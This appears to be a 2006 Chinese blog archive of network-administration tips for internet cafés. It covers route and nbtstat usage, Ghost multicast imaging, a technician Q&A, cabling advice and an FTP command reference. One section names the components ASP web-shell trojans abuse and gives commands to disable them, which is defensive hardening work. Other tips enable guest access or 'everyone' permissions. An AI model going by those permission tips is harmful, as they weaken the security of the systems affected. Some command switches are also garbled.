　　Tracert一般用来检测故障的位置，我们可以用tracert IP在哪个环节上出了问题，虽然还是没有确定是什么问题，但它已经告诉了我们问题所在的地方，我们也就可以很有把握的告诉别人----某某地方出了问题。 

　　2、Route 的使用技巧 

　　大多数主机一般都是驻留在只连接一台路由器的网段上。由于只有一台路由器，因此不存在使用哪一台路由器将数据报发表到远程计算机上去的问题，该路由器的IP地址可作为该网段上所有计算机的缺省网关来输入。但是，当网络上拥有两个或多个路由器时，我们就不一定想只依赖缺省网关了。实际上我们可能想让我们的某些远程IP地址通过某个特定的路由器来传递，而其他的远程IP则通过另一个路由器来传递。 

　　在这种情况下，我们需要相应的路由信息，这些信息储存在路由表中，每个主机和每个路由器都配有自己独一无二的路由表。大多数路由器使用专门的路由协议来交换和动态更新路由器之间的路由表。但在有些情况下，必须人工将项目添加到路由器和主机上的路由表中。Route就是用来显示、人工添加和修改路由表项目的。 

一般使用选项： 

　　·route print 

　　本命令用于显示路由表中的当前项目，在单路由器网段上的输出；由于用IP地址配置了网卡，因此所有的这些项目都是自动添加的。 

　　·route add 

　　使用本命令，可以将信路由项目添加给路由表。例如，如果要设定一个到目的网络209.98.32.33的路由，其间要经过5个路由器网段，首先要经过本地网络上的一个路由器，器IP为202.96.123.5，子网掩码为255.255.255.224，那么我们应该输入以下命令： 

　　route add 209.98.32.33 mask 255.255.255.224 202.96.123.5 metric 5 
　　·route change 

　　我们可以使用本命令来修改数据的传输路由，不过，我们不能使用本命令来改变数据的目的地。下面这个例子可以将数据的路由改到另一个路由器，它采用一条包含3个网段的更直的路径： 

　　route add 209.98.32.33 mask 255.255.255.224 202.96.123.250 metric 3 
　　·route delete 

　　使用本命令可以从路由表中删除路由。例如：route delete 209.98.32.33 

　　3、NBTStat的使用技巧 

　　使用 nbtstat 命令释放和刷新 NetBIOS 名称。NBTStat（TCP/IP上的NetBIOS统计数据）实用程序用于提供关于关于NetBIOS的统计数据。运用NetBIOS，我们可以查看本地计算机或远程计算机上的NetBIOS名字表格。 

　　常用选项： 
　　·nbtstat Cn 
　　显示寄存在本地的名字和服务程序。 
　　·nbtstat Cc 
　　本命令用于显示NetBIOS名字高速缓存的内容。NetBIOS名字高速缓存用于寸放与本计算机最近进行通信的其他计算机的NetBIOS名字和IP地址对。 
　　·nbtstat Cr 
　　本命令用于清除和重新加载NetBIOS名字高速缓存。 
　　·nbtstat -a IP 
　　通过IP显示另一台计算机的物理地址和名字列表，我们所显示的内容就像对方计算机自己运行nbtstat -n一样。 
　　·nbtstat -s IP 

　　显示实用其IP地址的另一台计算机的NetBIOS连接表。例如我们在命令提示符下，键入：nbtstat CRR 释放和刷新过程的进度以命令行输出的形式显示。该信息表明当前注册在该计算机的 WINS 中的所有本地 NetBIOS 名称是否已经使用 WINS 服务器释放和续订了注册。 


losevangel 发表于 >2006-10-5 2:18:46  [全文] [评论] [引用] [推荐] [档案] [推给好友] [收藏到网摘] 
 

2006-10-5
网络机房中Ghost 8.0的奇妙应用 

我们单位新建一个网络机房有60台TCL计算机，用Ghost 8.0企业版2小时全部装机完毕，效果非常好。现把方法介绍给你，不妨试一试。  

准备工作  

安装服务器，其操作系统为Windows 2000 server或Windows 2003，并配置好DHCP；选一台客户机安装好操作系统和相应的软件；用Usboot1.66软件做好U盘启动盘。  

Ghost8.0 企业版安装  

在服务器上安装Ghost8.0企业版，其实安装很简单，一路“下一步”，注意：在安装模式时，要选择第一项，就是“控制台”， 在安装组件时，一般不需要改动，用默认的就可以了。  

制作客户的启动盘  

在服务器上点击“开始→程序→Symantec Ghost Ghost Boot Wizard→Network Boot Disk”。  

点击“下一步”出现了网卡选择提示框。根据自己的网卡可以从中选择自己的网卡型号，由于在8.0版本里面常用都有 (8139的网卡驱动也有)选中后点击“下一步”出现选择DOS版本一是PC-DOS二是MS-DOS若选择MS-DOS则需要在Windwos98中做一张启动盘插入软驱点击“下一步”选择客户端的类型，采用默认的连续两次“下一步”出现客户端的网络设置，注意用DHCP服务器自动分配IP地址的办法，接下来可以选择启动盘在哪个软驱里做，以及做几张等等信息。一切都设置好以后，就可以开始制作启动盘了。  

开始网络复制  

1. 在服务器中启动Ghost 8.0的GhostCast Server，在“Session Name”处随便添一个名称，越简单越好，但是要记清楚，因为在客户端里要填入和这个一样的名称。后面有两个选项，第一个是“Restore Image”，意思是将镜像包加载到客户机上。第二个是“Create Image”，意思是建立镜像包。我们这里选择第二个。点击“Browse”按钮，为镜像包选择一个位置，起名并保存好。这是客户端系统的ghost镜像包。然后点击右侧的“Accept Clients”。开始接受客户端的请求（如图）。  

2. 在客户端计算机中修改COMS设置，选USB-HDD启动，用我们刚才做好的启动盘（U盘）启动电脑。正常情况下，开机应该自动进入Ghost，看到“Multicasting”选项已经有效，选择它，回车，在这里可以看到，客户端的Ip已经自动分配过来了，接着需要填写的就是服务器端的名称，在这里是“Server”。点击“OK”，在选择“No”，或者“Fast”。确认后开始上传镜像。  

3. 上传完毕后在服务器端选择“Restore Image”，并选择刚才做好的镜像包。然后点击“Accept Clients”等待客户端的请求，这时，就用U盘启动客户端。具体步骤和上面制作镜像包的步骤类似，首先是是启动，启动后进入Ghost，选择“Multicasting”，填入服务器端名称（Server），但是在填入服务器端名称之后，与上面的过程有所不同，客户端开始和服务器端联系，以获取当前Ghost包的详细信息，接着按照提示操作，全部客户端准备就绪后，在服务器端点击“Send”按钮，网络Ghost就真正开始了，大约于二十分钟，Ghost过程结束。依次重启每个客户端，更改计算机名和IP地址等信息。这样在两小时左右一个网络机房装备完毕 



losevangel 发表于 >2006-10-5 1:50:22  [全文] [评论] [引用] [推荐] [档案] [推给好友] [收藏到网摘] 
 

2006-10-5
网吧技术员资料问答 


网吧技术员资料问答
以下内容通用于网吧，网吧技术能在下面的问题启发充电，其实网吧就是这个样。凡事不要钻牛角尖，何不用最快的方式去解决问题，面对的问题不是一个，也不是两个，学到的是自已的，花的是在网吧，能多一点就算一点，电脑世界学海永无止境。本人技术有限，希望更多朋友发表以下未完成的答案及建设方案，作为大家抛砖引玉，投石问路。

一、电脑频繁自动重启,你会用什么步骤去查明原因解决?
*多数于电源按钮，内存不正常问题。

二.怎么样删除winxp/2000/2003的默认共享
（1）用记事本写上以下内容保存为bat批处理文件运行，但重启又会恢复，除非加入启动项里。 
@echo off
net share c＄ /del
net share d＄ /del
cls
net share e＄ /del
net share ipc＄ /del
cls
net share f＄ /del
net share g＄ /del
cls
net share h＄ /del
net share admin＄ /del
cls

（2）修改注册表永久删除共享：
在运行对话框中输入“regedit”并回车，打开注册表编辑器，在左侧面板中 
定位到“ 
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\ 
Parameters”,在该位置下新建一个名为“AutoShareWks”的DWORD值，并将 
其数值设置为“0”重启系统后所有的默认共享都将被自动删除，并且不会 
继续创建。

（3）Windows Registry Editor Version 5.00
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\lanmanserver\parameters]
"AutoShareServer"=dword:00000000
"AutoSharewks"=dword:00000000
将以上所有英文复制保存为reg文件直接导入重启生效，永久删除默认共享。

三.局域网中怎么使两台电脑能够免密码互相映射访问?
*在没作任何策略设置情况下，开启guest用户，相同的用户名和密码，就可以直接映射。如果可以映射但无法打开,原因是ntfs 中属性的安全权限必须加上everyone用户.

四.你对win2000以上系统的DOS工具认识有多少种及是否懂得使用?
* 目前DOS工具种类很多，maxdos工作室出品的DOS相对网吧来说比较适用，集成多种DOS下常用工具。
介绍：maxdos系列，eky ghost系列。 矮人工作室DOS 。任 逍遥DOS，等其他。

五.你会用什么工具什么方法怎么对局域网进行网络克隆?
*若说网络克隆maxdos5.5s挺不错，集成了20多种通用网卡驱动，即使生手也能简易操作。
*如果原先工作站没有安装网络克隆DOS工具，可以利用U盘版或软驱A盘装载克隆引导程序进行网克

六.会使用多少种PC系统?各种主要用途及性能。 
PC系统有很多种，有兴趣对各种系统进行研究的话可以利用虚拟机进行测试。利用虚拟光驱和虚拟机（比如VM）就可以达到你的目的。 
*操作系统介绍地址：http://tech.sina.com.cn/c/2002-01-10/8366.html 

七.是否熟悉构架WEB,网吧主页投票公告及FTP?熟悉程度如何?
前言：网吧构架web目的是制作网吧的主页，和电影点播。主页有利于用于公告及投票及上网顾客的网址导航。
*安装IIS（至少支持ASP）---下载免费全站程序，对网站进行修改，形成主页。win2003安装IIS的方法，打开“添加或删除程序”下一步选“添加或删除windows组件”，都看到了需安装的组件吧，根据需要选择安装就ok了。打勾为安装，没打勾为删除。
*FTP跟安装IIS一样简单，不推荐win系统自带FTP功能。目前较流行是server_U ftp 6.0或以后更高版本。设置比较容易。安装方法“
安装后--新建用户名--用户名的目录---设置用户目录的访问权限。
IIS默认端口80 FTP默认是21 如需互联网访问，只需在路由中设置转发规则。即在路由中将外网访问的80指向你的服务器IP。


八.300台电脑的网吧,你会用怎么样的方案去管理网吧,比如客机与服务器的配合使用更新.
个人观点：
服务器与工作站的配合使用，同时也确保服务器关闭后不影响工作站。工作站桌面背景，桌面快捷方式，所有启动项。都可以在服务器中集中管理，甚至经过优化的系统服务，都可以利用服务器调用批处理或VBS启用运行。至于克隆恢复系统，当然用网克了，怎么网克？用maxdos吧我网吧没有用任何特殊程序，可是上面这些我都做到了。

九.对无盘熟悉程度如何?认识并且熟悉操作哪种?
十.客户机桌面如何分布快捷方式,菜单程序管理?快捷方式文件夹管理?
个人观点：别在桌面上放不多不少图标。最好用菜单管理。

十一.电影收看方式:vod点播?菜单程序?直接共享?IIS或媒流处理?
电影收看方式在网吧中种类比较多，大致上以下几种：
1，直接共享， （观点：直接暴露了点）
2，菜单浏览共享 （观点：最适合懒人网管们了）
3，VOD程序，如万象VOD美萍VOD （观点：VOD是网页式，加入电影也很方便，支持多种协议，但程序出问题后就不能看了，另外网页播放器支持格式不够多，除非你的电影全是普通的rm.rmvb.wmv格）
4，WEB网页，如ASP，php（利用电影全站程序，专业一点的话可以用real流媒体处理协议播放，使用http和rstp的分别是rstp在网页中
播放快进可以继续加载缓冲，而用http快进效果就差了，通常卡住不动，如果用直接播放器播放电影无类是什么协议情况都很好，观点：华实美观，相似VOD共同缺点，同时加入电影比较麻烦，不像VOD拖动就能完成。）
5，专业流媒体服器一般MMS协议和rstp两种，http则是直接IIS中的默认协议网络播放，

十二.超出255台电脑的局域网,如何分配IP使其互相访问?
总结一句话：只需修改路由的掩码。
1.路由使用255.255.0.0
当然工作站可以设成255.255.0.0（或248或254）
IP:192.168.0.1-192.168.255.254
所有的客户机掩码都要设为255.255.0.0
2.只有300或400台的话建议路由用255.255.254.0掩码，加快局域网寻址速度。


十三.怎样利用双网卡分配双IP和单网卡分配双IP并同时可以使用?
1.一台机两个网卡分配两个IP（可以）。
2.两个网卡不能分配同样IP，（不可以），除非禁用一个。
3.一个网卡分配多个ip，（可以）打开tpc/IP设置属性---高级--IP设置就可以看到加多个IP了和掩码了。

十四.怎么防护应急内网攻击?及应急蠕虫病毒?
*网警软件，或专业查看内网攻击的软件（查看各IP网卡是不处于混合型模式），
*防火墙查看接受异常数据包的IP
*通过路由查看内网各IP的运行状态，可查看异常流量。
*在c盘system32目录下建个名为packet.dll的目录，设为“只读”，拒绝所有用户权限。
*未发生ARP风波前防护ARP办法，先在服务器安装Anti ARP Sniffer 并运行，如果局域网有ARP欺骗即时报警并说明攻击来源。
*用“arp -a > c:\IP-Mac.txt”生成本网吧IP－MAC地址对照表 ，
*用批处理绑定网关的IP地址MAC地址
Arp -s 网关IP地址 网关的MAC地址
*已发生ARP应急方法：去下载一个nbtscan 专门扫描ARP真实mac的工具。DOS命令：ARP -a 看到可能是假的mac 但nbtscan扫描的是真实mac，对比一下mac就知哪个是真哪个是假了。


十五.怎么样对2000/2003/xp进行优化成为网吧工作站?
*去除没必要的启动项
*支除没必要的“服务”项，如远程桌面，打印，windows更新等，
*修改注册表和BOOT文件加速开关机，
优化资料可以网上找到成堆。
十六.构架各种私服熟悉程度如何?
比如传奇，CS，魔兽世界比较热门私服。

十七.认识多少种游戏更新方式?菜单程序?映像程序?同步对比?
在网吧中游戏更新方式大致上有几个
*同步对比共享更新。（同步对比更新目前上两种，一种是手动，一种是自动。比如网吧同步专家是手动更新，伙狐自动更新）
*菜单更新。工作原理，当客机打开菜单，客户机首先将配置文件从服务器拷贝过来，并打开菜单目录，客户点击游戏时，程序先与服务器游戏目录对比更新再运行。比如迅闪3。1游戏更新
*使用映像盘。工作原理，将服务器的硬盘用虚拟软件映射至客机，客机生成多出一个游戏盘。映像盘不受限制，无论怎么更改重启后即还原。目录流行有：（易游，网众，锐起，scis 万象虚拟 addol游戏管理系统）

十八.熟悉多少种网吧收银系统?对哪种最熟悉?(IC卡 万象软/硬版,美平,......)
*IC卡
*万象软件版和硬件版（在南方地区比较通用）
*pubwin 网吧收费系统。（在北方较通用）
*其他则看当地指定收费系统

十九.会使多少种工具或修改方式对网吧客户机进行某些限制功能?
*网吧计费端自带权限限制功能
*网吧辅助工具，隐藏某些特殊文件程序，
*修改注册表。（不建议，一般工具可以解决又何必）
*组策略启用限制（效果很好，便利用工具也是可以恢复的，组策略限制大多会拖廷开机速度，很慢那种。）

二十.是否熟悉技术员及收银员交接班方案?
正规而有一定规模级网吧值得深思的问题。不应当作小问题来对待。

二一.认识多少种路由(软路\硬路)使用?熟悉程度如何?
软路：RouterOS ipcop、coyote Linux、LRP、smoothwall 各有千秋。
硬路：推荐华为，锐捷，思科。功能上可能不多，本人用过实在很稳定。

二二.分别自拟40G/80G/120G客户机装机方案?
二三.对各种还原精灵使用方式了解及注意项目.
*还原精灵种类很多，如“冰点”，“远志还原精灵”的单机版和网络版，国内甚为通用，然面树大招风，
通用的软件往往针对破解的软件就多，目前这两种已有破解软件针对了。
*经本人多次试验，intel865似乎安装国产还原精灵后无法开机，则冰点就可以。
*注意：一般情况下，进行ghost之前母盘应去除还原精灵在进行克隆，否则会有异常不能正常开机，安装了冰点的客户机可以用没有安装还原精灵的母盘进行ghost.ghost最好用8。0以上的版本，可以去除系统中的多余文件，比如**.sys虚拟内存

二四.详述新机硬盘无任何资料,手动分区及安装系统全过程.
1，利用含有分区工具光盘引导进去，BIOS设置CDrom启动，进入光盘引导DM或pq，diskgen，都可以进行自定义分区格式化。接着放入windows安装盘按提示安装即可。

二五.对各种软件程序熟悉程度？
dos分区和磁盘修复工具，office SQL IIS FTP 网页编辑软件。
杀毒软件 防火墙 播放器 制图软件 电子相关软件，我想有时间的话所有软件都值得一试。

ghost的应用技巧
CMOS优化
磁盘阵列简述 
修改BIOS开机画面 
系统克隆后无法进入系统解决方法。 
怎样清除忘记的 CMOS 口令? 
局域网一般有几种传输介质，怎么分类?
批处理或DOS的应用
忘记用户密码的解决方法
禁止格式化，防删除，防目标另存或隐藏
*进程管理小程序，当客机打开某些设定不允许访问和打开的窗口，自动关闭。
*修改系统中的shell32.dll及其他系统文件。利用EXESCOPE工具。细节请在网上寻资料。 
等等....
-------http://www.zhaoni.cn/f/list_1412_2_tl.html--------------古佰的天空--------- 
问：我使用的是Windows 2000 Server系统 ，每次启动都报错，提示在系统启动时至少有一个服务或驱动程序产生错误。查看系统日志显示“由于下列错误，Cdralw2k 服务启动失败：无法启动服务，原因可能是它被禁用或与它相关联的设备没有启动”。请问我该怎么办？


答：删除或重命名C:\Winnt\System32\Drivers文件夹的两个文件：

Cdralw2k.sys

Cdr4_2k.sys
----------------------------------------------------
server2003/xp/2000 每次弹出服务控制管理器“系统启动时至少有一个服务或驱动程序产生错误”解决方法。把以下注册表用记事本编辑，保存为**.reg ,直接点击导入即可。
Windows Registry Editor Version 5.00
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Windows]
"NoPopUpsOnBoot"=dword:00000001
如果导入失败，请进程手动操作。找到[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Windows]
右键新建dword值，命名为NoPopUpsOnBoot，设其值为“1”
OK，
----------------------------------------------------------DCOM 遇到错误“锁定服务数据库。 ”,试图以参数“”启动服务 netman 以运行服务器: 
DCOM 遇到错误“锁定服务数据库。 ”，试图以参数“”启动服务 netman 以运行服务器: 
{BA126AD1-2166-11D1-B1D0-00805FC1270E} 
如上的系统错误怎么解决方法如下：根据系统的提示操作，试图使用组件服务管理工具修改此安全权限是无法奏效的。有效方法是在注册表中修改相关键值，运行注册后，定位于“HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{6FE54E0E-009F-4E3D-A830-EDFA71E1F306}”，再查看右侧视图，记住“AppID”对应数值数据“{27AF75ED-20D9-11D1-B1CE-00805FC1270E}” 
此后，打开“组件服务”，依次选择“组件服务”→“计算机”→“我的电脑”→“DCOM配置”，点击菜单栏“查看”→“详细信息”，再在右侧视图中找到ID为“{27AF75ED-20D9-11D1-B1CE-00805FC1270E}”的应用程序“netman”，用鼠标右键单击，选择“属性”，在弹出窗口中切换到“安全”标签页，在“启动和激活权限”项目中点击“编辑”按钮，然后在弹出的“启动权限”对话框中添加“NETWORK SERVICE”用户，设置其权限为允许本地启动和激活。确认操作后，系统就不会再显示DCOM出错了 
--网吧游戏电影服务器安全相关-------------------------
1.修改默认空密码用户
2.禁用Telnet
3.删除默认共享.
4.禁用VBS脚本和BAT.防止病毒运行
5.禁用的所有远程相关的服务,如注册表服务,远程桌面控制(3389)服务等.
6.装有IIS的话请禁用FSO(FileSystemObject)防止挂马上传.

　　基于FileSystemObject组件的asp木马 

　　cacls %systemroot%\system32\scrrun.dll /e /d guests //禁止guests使用 

　　regsvr32 scrrun.dll /u /s //删除 

　　基于shell.application组件的asp木马 

　　cacls %systemroot%\system32\shell32.dll /e /d guests //禁止guests使用 

　　regsvr32 shell32.dll /u /s //删除 
目前比较流行的ASP木马主要通过三种技术来进行对服务器的相关操作。　　　 

　　一、使用FileSystemObject组件　　　 

　　二、使用WScript.Shell组件 
　 
　　三、使用Shell.Application组件　　　 

　　目前比较流行的ASP木马主要通过三种技术来进行对服务器的相关操作。　　　 

　　一、使用FileSystemObject组件 
　 
　　FileSystemObject可以对文件进行常规操作　　　 

　　可以通过修改注册表，将此组件改名，来防止此类木马的危害。　　　 

　　HKEY_CLASSES_ROOTScripting.FileSystemObject 

　　改名为其它的名字，如：改为FileSystemObject_ChangeName　　　 

　　自己以后调用的时候使用这个就可以正常调用此组件了 
　 
　　也要将clsid值也改一下 

　　HKEY_CLASSES_ROOTScripting.FileSystemObjectCLSID项目的值　　　 

　　也可以将其删除，来防止此类木马的危害。　　　 

　　注销此组件命令：RegSrv32 /u C:WINNTSYSTEMscrrun.dll 　　　 

　　禁止Guest用户使用scrrun.dll来防止调用此组件。 

　　使用命令：cacls C:WINNTsystem32scrrun.dll /e /d guests　　　 

　　二、使用WScript.Shell组件　　　 

　　WScript.Shell可以调用系统内核运行DOS基本命令　　　 

　　可以通过修改注册表，将此组件改名，来防止此类木马的危害。　　　 

　　HKEY_CLASSES_ROOTWScript.Shell 

　　及 

　　HKEY_CLASSES_ROOTWScript.Shell.1 

　　改名为其它的名字，如：改为WScript.Shell_ChangeName或WScript.Shell.1_ChangeName　　　 

　　自己以后调用的时候使用这个就可以正常调用此组件了　　　　 

　　也要将clsid值也改一下 

　　HKEY_CLASSES_ROOTWScript.ShellCLSID项目的值 

　　HKEY_CLASSES_ROOTWScript.Shell.1CLSID项目的值 
　 
　　也可以将其删除，来防止此类木马的危害。 


losevangel 发表于 >2006-10-5 1:45:58  [全文] [评论] [引用] [推荐] [档案] [推给好友] [收藏到网摘] 
 

2006-10-5
网吧综合布线之电源和网络布线经验谈 

网吧目前所提供的服务，像网页浏览、网络游戏、在线电影、远程教育等最基本的服务都与网络有关，网络质量的好坏直接决定了网吧的生存能力。所以，如何规划一个优质的网络环境，是网吧经营者必须要考虑的一个要点，其中网吧的综合布线占了很大的因素，主要有两大部分：电源布线和网络布线。 
电源系统的布线 
网吧电源系统的布线，可以分为设计、施工、验收三个步骤，在这三个步骤中需要注意以下规则和事项。 
一、布线设计 
现在市电供应系统普遍采用三相四线制供电模式，建议仍在使用两相供电的网吧更换为三相四线制的供电模式。对于普通网吧来说，网吧的主要用电系统有： 
1、空调：对网吧来说，空调已经成为一种标准配置，一般使用柜式空调，而且功耗很大，每台功率一般在3500-4500W之间。因此，在设计电源布线系统时，必须给空调配备专用电源线路。 
2、电脑：一般在对网吧电源系统布线设计时，容易产生一个误区，认为电脑使用的电源线随便拉一条就行。其实，网吧内总负载最大的还是电脑，在不配备音箱的情况下，功率一般在150W左右，机器数量增多，功率就明显增大。因此，网吧电脑使用的电源线，不应该是逐一串联的模式，而是使用分组点接，具体做法如下： 
每隔1.5米左右接入一只10A三芯国标插座（即墙上嵌入的独立插座）作为一个点，再将上述多孔插座接入，在1.5米的范围内，将会有4－5台电脑使用这一个插座接入电源；然后，可视实际情况把电脑按10台或16台为一组，每组由一个空气开关控制，整个网吧可以分为4-6组或者更多的组。 
根据每条主干的负载，合理选择电源线的型号。一般来说，主干线路使用铜芯线，下面的分支线路可以使用铝芯线（笔者建议，最好网吧电源系统的所有线路全部采用GB的铜芯线）。同时，根据电源的负载合理选择不同规格的电源线。 
3、网络设备和照明设备：对于有专业机柜的网吧，建议对路由器等价值较高的网络设备加UPS后备电源，以保护网络设备的安全。 
二、具体施工 
1、电源布线应该与房间装修同步进行，为了网吧环境的美观，不宜将电源线布置在明处，可以放置在PVC管道或专用的电源线通道中。 
2、对于比较重要的主干线路，最好在布线施工时多布设一条线路做备份线路。同时，为避免影响网线和电话线的传输质量，电源线最好单独走一个管道或者PVC槽子。对于一些不易进行二次施工的管道，请务必布设备用线路。 
3、选择电源主干和分支线路的规格时，建议在目前负载功率的基础上，上浮50-80％的数值，以满足未来网吧机器升级时的供电需求。 
4、在布设电源线时，应该做上一些标记。每个空气开关控制哪条线路，都要做详细的记录。 
三、验收 
所有电源布线工作结束后，必须在所有的布线管道未封闭之前进行一系列的验收和检测。电源系统的检测，主要分以下几个方面： 
1、测试所有设备工作是否正常：网吧电源布线工作结束后，请测试所有的线路是否能够正常工作，空气开关工作是否正常。 
2、网吧全负载运行：运行第一步测试后，把网吧内的设备分批次打开，并逐步达到网吧的全负载功率运行。全负载运行的时间最好在24小时以上，这样才能检验电源布线系统的真正性能。在全负载运行过程中，如果出现空气开关自动跳闸或者保险丝被烧断，请务必仔细检查原因。 
3、网吧超负荷运行：经过全负载运行后，可以进行短时间的超负荷运行，以检测电源系统的质量和抗压性能。超负荷运行的时间可以在十个小时左右，根据实际情况进行测试。 
四、需要注意的几个问题 
网吧电源布线的整个过程中，必须高度重视一些小问题，一些微小失误就可能造成无法估计的损失。 
1、地线的安装：细心的技术人员会发现，在电脑的三相电源插头中，负责接地的那一芯，是没有电源线的，也就是缺乏有效的接地措施。但是，网吧内电脑和一些网络设备，在正常工作中外壳都可能产生一些静电，如果没有有效的接地措施，静电积累到一定程度，可能会烧坏硬件或者击伤人。因此，在网吧电源布线时，必须安装地线。 
2、避雷措施：在很多技术人员眼中，避雷似乎与网吧毫不相关，但是，如果网吧没有良好的避雷措施，遇到雷击时，可能会烧毁网吧内所有的设备。 
3、备份线路：对于网吧电源系统的主干线路或一些不方便检修的线路，一定要布设备份线路，如果主线路损坏，立即更换成备份线路。特别是对于正在营业中的网吧，布设备份线路是提高网吧自身竞争力的一大举措。 
4、高质量的配线间：对于百台以上的网吧，在设计电源系统时最好准备一个独立的空间安装空气开关、UPS及其它的网吧电源设备。 
5、在使用三相四线制供电系统的网吧，设计电源系统时，要保证三根火线的负载不要相差太大，差值以500W左右最佳。 
网吧电源系统的布线，最好找专业的电工技师或者专业的综合布线人员来做，并且要做好布线的档案记录工作，每一条电源线的负责范围、走向如何等都要记录在文档中，以方便日后维护。
 


文件复制命令COPY（内部命令）
格式：COPY[源盘符][源路径]<源文件名>[目标盘符][目标路径][目标文件名]

功能：将指定盘上的一个或多个文件复制到另一指定磁盘的指定目录下

说明：

源文件名和目标文件名均可使用通配符（*及?） 
指定目标文件名时为改名复制，省略目标文件名为同名拷贝，但同盘拷贝时目标文件不能与原文件同名 
不能拷贝隐含和系统属性的文件 
例1 将C盘上WPS子目录下的所有*.WPS文件复制到A盘

C:\>COPY C:\WPS\*.WPS A: 

例2 将当前A盘上的TEST1.TEX文件拷贝到C盘上，并改名为TEST2.TXT

C:\>COPY A:TEST1.TXT C:\TEST2.TXT 回答者： yueyunqingxi | 四级 | 2009-10-12 12:04 
           ftp
open FTP地址
FTP用户名
FTP密码
ascii(这里是文本文件格式。若是二进制数据用binary)
cd 目录
get xxx.exe
bye 
==============
曾经做过一个自动下载IP脚本，看看吧
@echo off
echo open FTP地址>GET_IP.LOG
echo FTP用户名>>GET_IP.LOG
echo FTP密码>>GET_IP.LOG
echo ascii>>GET_IP.LOG
echo cd upload>>GET_IP.LOG
echo get IP.txt>>GET_IP.LOG
echo bye >>GET_IP.LOG
ping 127.0 -n 2 >nul
ftp -s:GET_IP.LOG 
del GET_IP.LOG 回答者： m1grand | 五级 | 2009-10-13 00:50 
把你的路径给我，我来写一个给你。 回答者： 360安全士兵 | 六级 | 2009-10-13 20:44 
           cd \
ftp :*.*.*.*
anonymous
123
ls
cd ???
binary
get *.* 
//OK



FTP的命令行格式为： ftp -v -d -i -n -g [主机名] ，其中 -v 显示远程服务器的所有响应信息； -n 限制ftp的自动登录，即不使用； .n etrc文件； -d 使用调试方式； -g 取消全局文件名。 

ftp使用的内部命令如下(中括号表示可选项): 

1.![cmd[args]]：在本地机中执行交互shell，exit回到ftp环境，如： !ls*.zip. 

2.$ macro-ame[args]：执行宏定义macro-name. 

3.account[password]：提供登录远程系统成功后访问系统资源所需的补 充口令。 

4.append local-file[remote-file]：将本地文件追加到远程系统主机， 若未指定远程系统文件名，则使用本地文件名。 

5.ascii：使用ascii类型传输方式。 

6.bell：每个命令执行完毕后计算机响铃一次。 

7.bin：使用二进制文件传输方式。 

8.bye：退出ftp会话过程。 

9.case：在使用mget时，将远程主机文件名中的大写转为小写字母。 

10.cd remote-dir：进入远程主机目录。 

11.cdup：进入远程主机目录的父目录。 

12.chmod mode file-name：将远程主机文件file-name的存取方式设置为 mode，如： chmod 777 a.out 。 

13.close：中断与远程服务器的ftp会话(与open对应)。 

14.cr：使用asscii方式传输文件时，将回车换行转换为回行。 

15.delete remote-file：删除远程主机文件。 

16.debug[debug-value]：设置调试方式， 显示发送至远程主机的每条命 令，如： deb up 3，若设为0，表示取消debug。 

17.dir[remote-dir][local-file]：显示远程主机目录，并将结果存入本 地文件local-file。 

18.disconnection：同close。 

19.form format：将文件传输方式设置为format，缺省为file方式。 

20.get remote-file[local-file]： 将远程主机的文件remote-file传至 本地硬盘的local-file。 

21.glob：设置mdelete，mget，mput的文件名扩展，缺省时不扩展文件名， 同命令行的-g参数。 

22.hash：每传输1024字节，显示一个hash符号(#)。 

23.help[cmd]：显示ftp内部命令cmd的帮助信息，如：help get。 

24.idle[seconds]：将远程服务器的休眠计时器设为[seconds]秒。 

25.image：设置二进制传输方式(同binary)。 

26.lcd[dir]：将本地工作目录切换至dir。 

27.ls[remote-dir][local-file]：显示远程目录remote-dir， 并存入本 地文件local-file。 

28.macdef macro-name：定义一个宏，遇到macdef下的空行时，宏定义结 束。 

29.mdelete[remote-file]：删除远程主机文件。 

30.mdir remote-files local-file：与dir类似，但可指定多个远程文件， 如： mdir *.o.*.zipoutfile 。 

31.mget remote-files：传输多个远程文件。 

32.mkdir dir-name：在远程主机中建一目录。 

33.mls remote-file local-file：同nlist，但可指定多个文件名。 

34.mode[modename]：将文件传输方式设置为modename， 缺省为stream方 式。 

35.modtime file-name：显示远程主机文件的最后修改时间。 

36.mput local-file：将多个文件传输至远程主机。 

37.newer file-name： 如果远程机中file-name的修改时间比本地硬盘同 名文件的时间更近，则重传该文件。 

38.nlist[remote-dir][local-file]：显示远程主机目录的文件清单，并 存入本地硬盘的local-file。 

39.nmap[inpattern outpattern]：设置文件名映射机制， 使得文件传输 时，文件中的某些字符相互转换，如：nmap $1.$2.$3[$1，$2].[$2，$3]，则 传输文件a1.a2.a3时，文件名变为a1，a2。该命令特别适用于远程主机为非UNIX 机的情况。 

40.ntrans[inchars[outchars]]：设置文件名字符的翻译机制，如ntrans 1R，则文件名LLL将变为RRR。 

41.open host[port]：建立指定ftp服务器连接，可指定连接端口。 

42.passive：进入被动传输方式。 

43.prompt：设置多个文件传输时的交互提示。 

44.proxy ftp-cmd：在次要控制连接中，执行一条ftp命令， 该命令允许 连接两个ftp服务器，以在两个服务器间传输文件。第一条ftp命令必须为open， 以首先建立两个服务器间的连接。 

45.put local-file[remote-file]：将本地文件local-file传送至远程主 机。 

46.pwd：显示远程主机的当前工作目录。 

47.quit：同bye，退出ftp会话。 

48.quote arg1，arg2...：将参数逐字发至远程ftp服务器，如： quote syst. 

49.recv remote-file[local-file]：同get。 

50.reget remote-file[local-file]：类似于get，但若local-file存在， 则从上次传输中断处续传。 

51.rhelp[cmd-name]：请求获得远程主机的帮助。 

52.rstatus[file-name]：若未指定文件名，则显示远程主机的状态，否 则显示文件状态。 

53.rename[from][to]：更改远程主机文件名。 

54.reset：清除回答队列。 

55.restart marker：从指定的标志marker处，重新开始get或put，如： restart 130。 

56.rmdir dir-name：删除远程主机目录。 

57.runique：设置文件名唯一性存储，若文件存在，则在原文件后加后缀 ..1，.2等。 

58.send local-file[remote-file]：同put。 

59.sendport：设置PORT命令的使用。 

60.site arg1，arg2...：将参数作为SITE命令逐字发送至远程ftp主机。 

61.size file-name：显示远程主机文件大小，如：site idle 7200。 

62.status：显示当前ftp状态。 

63.struct[struct-name]：将文件传输结构设置为struct-name， 缺省时 使用stream结构。 

64.sunique：将远程主机文件名存储设置为唯一(与runique对应)。 

65.system：显示远程主机的操作系统类型。 

